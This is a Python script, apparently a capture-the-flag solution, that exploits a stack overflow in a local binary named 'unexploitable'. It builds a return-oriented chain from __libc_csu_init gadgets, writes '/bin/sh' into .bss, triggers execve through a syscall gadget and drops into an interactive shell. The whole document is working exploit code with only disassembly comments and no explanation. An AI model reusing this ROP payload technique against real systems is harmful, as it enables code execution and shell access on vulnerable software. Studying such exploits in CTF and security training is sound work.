from zio import *
from time import sleep


target = './unexploitable'
io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), print_write=COLORED(RAW, 'green'))

gadget_1 = 0x00000000004005E6
gadget_2 = 0x00000000004005D0
read_addr = 0x0000000000601000
bss_addr = 0x0000000000601028
vuln_addr = 0x0000000000400544
execve_syscall_id  = 0x3b
syscall_addr = 0x00400560

'''
.text:00000000004005D0                 mov     rdx, r15
.text:00000000004005D3                 mov     rsi, r14
.text:00000000004005D6                 mov     edi, r13d
.text:00000000004005D9                 call    qword ptr [r12+rbx*8]
.text:00000000004005DD                 add     rbx, 1
.text:00000000004005E1                 cmp     rbx, rbp
.text:00000000004005E4                 jnz     short loc_4005D0

.text:00000000004005E6 loc_4005E6:                             ; CODE XREF: __libc_csu_init+48j

.text:00000000004005E6                 mov     rbx, [rsp+8]		
.text:00000000004005EB                 mov     rbp, [rsp+10h]   
.text:00000000004005F0                 mov     r12, [rsp+18h]	
.text:00000000004005F5                 mov     r13, [rsp+20h]	
.text:00000000004005FA                 mov     r14, [rsp+28h]	
.text:00000000004005FF                 mov     r15, [rsp+30h]	
.text:0000000000400604                 add     rsp, 38h
.text:0000000000400608                 retn

junk = "A"*24
payload = junk + "BBBBBB"+"\x00\x00"
'''

payload =  "A" * 24
payload += l64(gadget_1) + "A" * 8
payload += l64(0) + l64(1) + l64(read_addr) + l64(0) + l64(bss_addr) + l64(execve_syscall_id)
payload += l64(gadget_2)

payload += l64(gadget_1)
payload += l64(0) + l64(1) + l64(bss_addr+0x8) + l64(bss_addr) + l64(0) + l64(0)
payload += l64(gadget_2)


io.gdb_hint([0x00000000004005E6])

sleep(3)
io.writeline(payload)
sleep(3)
io.writeline(('/bin/sh\x00' + l64(syscall_addr)).ljust(execve_syscall_id, '\x00')) #read bytes --> rax


io.interact()